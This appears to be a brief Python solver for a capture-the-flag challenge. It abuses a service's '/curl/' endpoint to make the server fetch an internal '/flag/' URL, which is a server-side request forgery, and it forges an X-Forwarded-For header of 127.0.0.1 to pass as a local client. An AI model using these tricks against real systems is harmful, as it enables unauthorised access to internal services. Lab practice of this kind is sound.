import requests 

url = "http://localhost:9999"

r = requests.get(
    f"{url}/curl/?url=http://localhost:8080/flag/&header_key=&header_value=",
    headers={"X-Forwarded-For": "127.0.0.1"})

print(r.text)